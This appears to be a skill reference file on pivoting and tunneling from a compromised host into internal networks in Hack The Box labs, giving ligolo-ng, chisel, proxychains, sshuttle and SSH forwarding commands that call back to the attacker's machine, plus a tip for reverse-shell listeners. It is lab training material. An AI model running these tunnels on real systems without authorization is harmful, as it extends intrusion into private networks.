---
name: htb-pivoting
description: >
  Pivoting and tunneling into non-routable internal networks on an HTB lab
  (Pro Labs, multi-machine) or authorized environment. Trigger when a compromised
  machine gives access to a subnet that your attack host cannot reach directly.
  Covers: ligolo-ng, chisel, proxychains, sshuttle, and SSH port forwarding.
  Produces a route/proxy into the internal network to relaunch scans and exploits
  there.
metadata:
  type: reference
  category: pivoting
  legal: "Authorized targets only (HTB, labs, CTF, systems you own)."
---

# HTB — Pivoting & tunneling

## When to use this skill
A compromised box ("foothold") has a second interface to an internal network
(e.g. `172.16.x.x`) that you cannot reach from `tun0`. You need to tunnel your
traffic through it.

## Option A — ligolo-ng (recommended, the simplest)
```bash
# 1) On your side: tun interface + proxy
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert          # note the listening port (11601)

# 2) On the target: run the agent (transferred via htb-shells)
./agent -connect YOUR_tun0_IP:11601 -ignore-cert     # Linux
#  .\agent.exe -connect ... (Windows)

# 3) In the ligolo console: select the session then
#    session   -> choose the agent
#    ifconfig  -> view the internal subnet
# 4) On your side: route the subnet via the ligolo interface
sudo ip route add 172.16.1.0/24 dev ligolo
#    then in ligolo:  start
```
After that, `nmap 172.16.1.5` works directly (no need for proxychains).

## Option B — chisel (SOCKS proxy)
```bash
# On your side (server)
chisel server -p 8000 --reverse
# On the target (client -> reverse SOCKS)
./chisel client YOUR_IP:8000 R:socks
# On your side: route tools through the proxy 127.0.0.1:1080
# /etc/proxychains4.conf ->  socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 172.16.1.5
proxychains netexec smb 172.16.1.0/24
```

## Option C — SSH (if you have SSH creds on the pivot)
```bash
# Dynamic port forward (SOCKS)
ssh -D 1080 user@PIVOT     # then proxychains
# Local port forward (a specific service)
ssh -L 8080:172.16.1.5:80 user@PIVOT   # 127.0.0.1:8080 -> internal service
# sshuttle (VPN-like, transparent)
sshuttle -r user@PIVOT 172.16.1.0/24
```

## Reflexes
- **proxychains** handles only TCP connect well; with nmap use `-sT -Pn`
  (no SYN/UDP scan through a SOCKS proxy).
- ligolo avoids proxychains: more reliable for full scans and reverse shells.
- For a reverse shell from an internal box, add a *listener* on the ligolo side
  (`listener_add`) that forwards to your `tun0`.
- Document the topology (which box sees which network) as you go.
